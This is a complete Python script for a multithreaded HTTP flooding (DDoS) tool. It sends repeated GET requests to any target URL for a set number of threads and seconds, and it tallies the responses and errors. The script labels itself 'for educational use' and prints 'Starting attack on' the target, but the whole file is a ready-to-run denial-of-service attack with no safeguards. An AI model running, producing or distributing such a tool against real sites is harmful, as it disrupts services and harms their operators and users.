import threading
import requests
import time
import argparse
import logging
import queue

STATS = {
    'sent': 0,
    'errors': 0,
    'responses': {},
}
STATS_LOCK = threading.Lock()

class DDoSThread(threading.Thread):
    def __init__(self, target_url, stats_queue):
        super().__init__()
        self.target_url = target_url
        self.stats_queue = stats_queue
        self.running = True

    def run(self):
        while self.running:
            try:
                response = requests.get(self.target_url, timeout=2)
                with STATS_LOCK:
                    STATS['sent'] += 1
                    code = response.status_code
                    STATS['responses'][code] = STATS['responses'].get(code, 0) + 1
                self.stats_queue.put(('response', code))
            except Exception as e:
                with STATS_LOCK:
                    STATS['sent'] += 1
                    STATS['errors'] += 1
                self.stats_queue.put(('error', str(e)))

    def stop(self):
        self.running = False

def stats_logger(stats_queue):
    while True:
        try:
            event, data = stats_queue.get(timeout=1)
            if event == 'response':
                logging.info(f"Response: {data}")
            elif event == 'error':
                logging.error(f"Error: {data}")
        except queue.Empty:
            continue

def main():
    parser = argparse.ArgumentParser(description='Basic DDoS tool for educational use.')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--duration', type=int, default=30, help='Duration in seconds')
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s: %(message)s')
    stats_queue = queue.Queue()
    threads = [DDoSThread(args.url, stats_queue) for _ in range(args.threads)]
    for t in threads:
        t.start()
    logger_thread = threading.Thread(target=stats_logger, args=(stats_queue,), daemon=True)
    logger_thread.start()

    print(f"Starting attack on {args.url} with {args.threads} threads for {args.duration} seconds...")
    start_time = time.time()
    try:
        while time.time() - start_time < args.duration:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Interrupted by user.")
    finally:
        for t in threads:
            t.stop()
        for t in threads:
            t.join()
        print("Attack finished.")
        print(f"Total requests sent: {STATS['sent']}")
        print(f"Errors: {STATS['errors']}")
        print(f"Responses: {STATS['responses']}")

if __name__ == '__main__':
    main()
